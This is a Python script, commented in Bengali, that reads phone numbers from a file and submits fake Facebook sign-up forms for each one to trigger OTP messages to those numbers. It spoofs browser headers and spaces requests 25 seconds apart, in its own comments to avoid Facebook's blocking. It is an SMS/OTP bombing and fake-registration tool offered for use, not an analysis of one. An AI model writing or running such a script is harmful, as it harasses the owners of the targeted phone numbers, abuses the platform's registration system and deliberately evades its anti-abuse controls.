import requests
import time
import os
import random

INPUT_FILE = "numbers.txt"
DELAY = 25  # ফেসবুকের ব্লক এড়াতে ২৫ সেকেন্ড গ্যাপ

def send_request(phone):
    print(f"\n[*] Sending request to: {phone}")
    
    url = "https://m.facebook.com/reg/submit/"
    
    # ব্রাউজারের মতো হেডার সেট করা
    headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://m.facebook.com',
        'Referer': 'https://m.facebook.com/reg/',
    }

    # রেজিস্ট্রেশন ডাটা
    data = {
        'lsd': 'AVq5r...', # এটি অটো জেনারেট হয়, এখানে র্যান্ডম দিলেও চলে
        'firstname': 'Rahim',
        'lastname': 'Khan',
        'reg_email__': phone,
        'sex': '2', # Male
        'birthday_day': '10',
        'birthday_month': '05',
        'birthday_year': '1998',
        'reg_passwd__': 'Pass' + str(random.randint(1000, 9999)),
        'submit': 'Sign Up'
    }

    try:
        # সেশন ব্যবহার করা যাতে ফেসবুক মনে করে এটি একটি আসল ব্রাউজার
        session = requests.Session()
        response = session.post(url, data=data, headers=headers, timeout=15)
        
        if response.status_code == 200:
            print(f"[+] Success: OTP trigger request sent to {phone}")
        else:
            print(f"[-] Failed: Server returned status {response.status_code}")
            
    except Exception as e:
        print(f"[-] Network Error: {e}")

def main():
    if not os.path.exists(INPUT_FILE):
        print(f"[-] Error: {INPUT_FILE} not found!")
        return

    with open(INPUT_FILE, "r") as f:
        numbers = [line.strip() for line in f if line.strip()]

    print(f"[*] Total {len(numbers)} numbers. Let's go!")
    print("-" * 30)

    for num in numbers:
        send_request(num)
        time.sleep(DELAY)

if __name__ == "__main__":
    main()
